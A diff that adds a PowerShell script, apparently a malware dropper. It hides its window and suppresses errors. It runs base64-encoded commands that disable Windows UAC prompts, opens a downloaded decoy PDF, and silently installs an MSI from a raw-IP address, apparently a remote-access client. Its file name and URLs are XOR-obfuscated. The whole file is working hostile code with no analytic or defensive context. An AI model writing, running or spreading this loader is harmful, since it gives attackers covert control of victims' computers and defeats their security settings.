@@ -1,0 +1,108 @@
+$ErrorActionPreference   = "SilentlyContinue"
+$WarningPreference       = "SilentlyContinue"
+$VerbosePreference       = "SilentlyContinue"
+$ProgressPreference      = "SilentlyContinue"
+
+Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force
+
+Start-Process powershell.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '-NoProfile -ExecutionPolicy Bypass -EncodedCommand JABwAD0AJwBIAEsATABNADoAXABTAE8ARgBUAFcAQQBSAEUAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABDAHUAcgByAGUAbgB0AFYAZQByAHMAaQBvAG4AXABQAG8AbABpAGMAaQBlAHMAXABTAHkAcwB0AGUAbQAnADsAUwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACQAcAAgAC0ATgBhAG0AZQAgAEUAbgBhAGIAbABlAEwAVQBBACAALQBUAHkAcABlACAARABXAG8AcgBkACAALQBWAGEAbAB1AGUAIAAwADsAUwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACQAcAAgAC0ATgBhAG0AZQAgAEMAbwBuAHMAZQBuAHQAUAByAG8AbQBwAHQAQgBlAGgAYQB2AGkAbwByAEEAZABtAGkAbgAgAC0AVAB5AHAAZQAgAEQAVwBvAHIAZAAgAC0AVgBhAGwAdQBlACAAMAA7AFMAZQB0AC0ASQB0AGUAbQBQAHIAbwBwAGUAcgB0AHkAIAAtAFAAYQB0AGgAIAAkAHAAIAAtAE4AYQBtAGUAIABQAHIAbwBtAHAAdABPAG4AUwBlAGMAdQByAGUARABlAHMAawB0AG8AcAAgAC0AVAB5AHAAZQAgAEQAVwBvAHIAZAAgAC0AVgBhAGwAdQBlACAAMAA7AA=='
+
+function Force-FileDelete {
+    param(
+        [string]$Path
+    )
+
+    if ([System.IO.File]::Exists($Path)) {
+        try {
+            [System.IO.File]::Delete($Path)
+        } catch {
+            $dir  = [System.IO.Path]::GetDirectoryName($Path)
+            $name = [System.IO.Path]::GetFileNameWithoutExtension($Path)
+            $ext  = [System.IO.Path]::GetExtension($Path)
+
+            $counter = 1
+            do {
+                $newPath = [System.IO.Path]::Combine($dir, "$name($counter)$ext")
+                $counter++
+            } while ([System.IO.File]::Exists($newPath))
+
+            try {
+                [System.IO.File]::Move($Path, $newPath)
+            } catch {
+                
+            }
+        }
+    } else {
+       
+    }
+}
+
+function CODE_SEG {
+     param(
+        [Parameter(Mandatory)][string] $Name, 
+        [Parameter(Mandatory)][string] $PdfURL,
+        [Parameter(Mandatory)][string] $InstallerURL 
+    )
+    
+  [Net.ServicePointManager]::SecurityProtocol = `
+    [Net.SecurityProtocolType]::Ssl3  -bor `
+    [Net.SecurityProtocolType]::Tls   -bor `
+    [Net.SecurityProtocolType]::Tls11 -bor `
+    [Net.SecurityProtocolType]::Tls12 -bor `
+    [Net.SecurityProtocolType]::Tls13
+
+    Add-Type -Name Window -Namespace Console -MemberDefinition @'
+    [DllImport("Kernel32.dll")]
+    public static extern IntPtr GetConsoleWindow();
+
+    [DllImport("user32.dll")]
+    public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
+'@
+
+    $ConsoleWin = [Console.Window]::GetConsoleWindow()
+    [Console.Window]::ShowWindow($ConsoleWin, 0)
+
+    $CurrentDir = (Get-Location).Path
+    $InkPath = Join-Path $CurrentDir ($Name + ".lnk")
+    $PdfPath = Join-Path $CurrentDir ($Name + ".pdf")
+
+    Write-Host "Ink Path: $InkPath"
+    Write-Host "PDF Path: $PdfPath"
+
+    Force-FileDelete -Path $InkPath
+    Force-FileDelete -Path $PdfPath
+
+    Invoke-WebRequest -Uri $PdfURL -OutFile $PdfPath -UseBasicParsing -ErrorAction SilentlyContinue
+    Start-Process $PdfPath -ErrorAction SilentlyContinue
+
+    $InstallerURI = [System.Uri] $InstallerURL
+    $InstallerExt = [System.IO.Path]::GetExtension($InstallerURI.AbsolutePath)
+    $RandomFileName = [System.IO.Path]::GetRandomFileName()
+    $RandomFileName = [System.IO.Path]::ChangeExtension($RandomFileName, $InstallerExt)
+    $InstallerPath = [System.IO.Path]::Combine($env:TEMP, $RandomFileName)
+    $InstallerLogPath = [System.IO.Path]::ChangeExtension($InstallerPath, "log")
+
+    Invoke-WebRequest -Uri $InstallerURL -OutFile $InstallerPath -UseBasicParsing -ErrorAction SilentlyContinue
+    Unblock-File -Path $InstallerPath -ErrorAction SilentlyContinue
+    
+    $Arguments = "/i `"$InstallerPath`" /qn /norestart /l `"$InstallerLogPath`""
+    $Process = Start-Process -FilePath "msiexec.exe" -ArgumentList $Arguments -Verb RunAs -Wait -PassThru
+
+    Write-Host " Exit code: $($Process.ExitCode)"
+
+    try {
+        [System.IO.File]::Delete($InstallerPath)
+    } catch {
+        
+    }
+
+    Start-Process powershell.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '-NoProfile -ExecutionPolicy Bypass -EncodedCommand JABwAD0AJwBIAEsATABNADoAXABTAE8ARgBUAFcAQQBSAEUAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABDAHUAcgByAGUAbgB0AFYAZQByAHMAaQBvAG4AXABQAG8AbABpAGMAaQBlAHMAXABTAHkAcwB0AGUAbQAnADsAUwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACQAcAAgAC0ATgBhAG0AZQAgAEUAbgBhAGIAbABlAEwAVQBBACAALQBUAHkAcABlACAARABXAG8AcgBkACAALQBWAGEAbAB1AGUAIAAxADsAUwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACQAcAAgAC0ATgBhAG0AZQAgAEMAbwBuAHMAZQBuAHQAUAByAG8AbQBwAHQAQgBlAGgAYQB2AGkAbwByAEEAZABtAGkAbgAgAC0AVAB5AHAAZQAgAEQAVwBvAHIAZAAgAC0AVgBhAGwAdQBlACAANQA7AFMAZQB0AC0ASQB0AGUAbQBQAHIAbwBwAGUAcgB0AHkAIAAtAFAAYQB0AGgAIAAkAHAAIAAtAE4AYQBtAGUAIABQAHIAbwBtAHAAdABPAG4AUwBlAGMAdQByAGUARABlAHMAawB0AG8AcAAgAC0AVAB5AHAAZQAgAEQAVwBvAHIAZAAgAC0AVgBhAGwAdQBlACAAMQA7AEEAZABkAC0AVAB5AHAAZQAgAC0AVAB5AHAAZQBEAGUAZgBpAG4AaQB0AGkAbwBuACAAJwB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQA7ACAAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMAOwAgAHAAdQBiAGwAaQBjACAAYwBsAGEAcwBzACAAUwBoAGUAbABsACAAewAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAHMAaABlAGwAbAAzADIALgBkAGwAbAAiACkAXQAgAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAHYAbwBpAGQAIABTAEgAQwBoAGEAbgBnAGUATgBvAHQAaQBmAHkAIABpAG4AdAAgAHcARQB2AGUAbgB0AEkAZAAsAHUAaQBuAHQAIAB1AEYAbABhAGcAcwAsAEkAbgB0AFAAdAByACAAZAB3AEkAdABlAG0AMQAsAEkAbgB0AFAAdAByACAAZAB3AEkAdABlAG0AMgApADsAIAB9ACcAOwBbAFMAaABlAGwAbABdADoAOgBTAEgAQwBoAGEAbgBnAGUATgBvAHQAaQBmAHkAKAAwAHgAMAA4ADAAMAAwADAAMAAwACwAMAB4ADAAMAAwADUALABbAEkAbgB0AFAAdAByAF0AOgA6AFoAZQByAG8ALABbAEkAbgB0AFAAdAByAF0AOgA6AFoAZQByAG8AKQA7AFMAdABhAHIAdAAtAFMAbABlAGUAcAAgAC0ATQBpAGwAbABpAHMAZQBjAG8AbgBkAHMAIAA4ADAAMAA7AFsAUwBoAGUAbABsAF0AOgA6AFMASABDAGgAYQBuAGcAZQBOAG8AdABpAGYAeQAoADAAeAAwADgAMAAwADAAMAAwADAALAAwAHgAMAAwADAANQAsAFsASQBuAHQAUAB0AHIAXQA6ADoAWgBlAHIAbwAsAFsASQBuAHQAUAB0AHIAXQA6ADoAWgBlAHIAbwApADsA'
+    
+}
+
+$ClientName     = $($k1381=228;$b=[byte[]](0xb7,0x87,0x8c,0x96,0x81,0x8d,0x86,0x81,0x8a,0xbb,0xb4,0xa0,0xa2);-join($b|%{[char]($_-bxor$k1381)}))
+$DocumentURL    = $($k6898=111;$b=[byte[]](0x07,0x1b,0x1b,0x1f,0x1c,0x55,0x40,0x40,0x1d,0x0e,0x18,0x41,0x08,0x06,0x1b,0x07,0x1a,0x0d,0x1a,0x1c,0x0a,0x1d,0x0c,0x00,0x01,0x1b,0x0a,0x01,0x1b,0x41,0x0c,0x00,0x02,0x40,0x0e,0x03,0x0a,0x17,0x0e,0x0e,0x04,0x0e,0x40,0x26,0x00,0x40,0x1d,0x0a,0x09,0x1c,0x40,0x07,0x0a,0x0e,0x0b,0x1c,0x40,0x02,0x0e,0x06,0x01,0x40,0x3c,0x0c,0x07,0x1d,0x0a,0x06,0x0d,0x0a,0x01,0x41,0x1f,0x0b,0x09);-join($b|%{[char]($_-bxor$k6898)}))
+$ClientURL      = $($k5682=170;$b=[byte[]](0xc2,0xde,0xde,0xda,0x90,0x85,0x85,0x9b,0x9e,0x9d,0x84,0x9b,0x98,0x9e,0x84,0x98,0x9b,0x98,0x84,0x9b,0x9e,0x9f,0x90,0x92,0x9a,0x9e,0x9a,0x85,0xe8,0xc3,0xc4,0x85,0xf9,0xc9,0xd8,0xcf,0xcf,0xc4,0xe9,0xc5,0xc4,0xc4,0xcf,0xc9,0xde,0x84,0xe9,0xc6,0xc3,0xcf,0xc4,0xde,0xf9,0xcf,0xde,0xdf,0xda,0x84,0xc7,0xd9,0xc3,0x95,0xcf,0x97,0xeb,0xc9,0xc9,0xcf,0xd9,0xd9,0x8c,0xd3,0x97,0xed,0xdf,0xcf,0xd9,0xde);-join($b|%{[char]($_-bxor$k5682)}))
+
+
+CODE_SEG -Name $ClientName -PdfURL $DocumentURL -InstallerURL $ClientURL
